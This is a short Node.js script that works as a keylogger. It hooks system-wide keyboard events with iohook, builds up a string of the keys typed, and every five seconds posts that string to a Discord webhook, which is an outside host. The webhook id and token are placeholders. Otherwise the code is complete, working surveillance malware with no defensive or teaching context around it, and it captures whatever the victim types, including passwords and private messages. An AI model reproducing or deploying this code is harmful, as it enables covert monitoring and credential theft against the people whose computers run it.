//Dependencies
const Discord = require("discord.js")
const Keycode = require("keycode")
const IOHook = require("iohook")

//Variables
const Webhook = new Discord.WebhookClient("webhookid", "webhooktoken")

var keys = ""

//Main
IOHook.on("keydown", (event)=>{
    const key = Keycode(event.rawcode)

    if(keys.length == 0){
        keys = key
    }else{
        if(key.indexOf("pace") != -1){
            keys += " "
        }else{
            keys += key
        }
    }
})

IOHook.start()

setInterval(function(){
    if(keys.length == 0){
        return
    }else{
        Webhook.send(keys)

        keys = ""
    }
}, 5000)
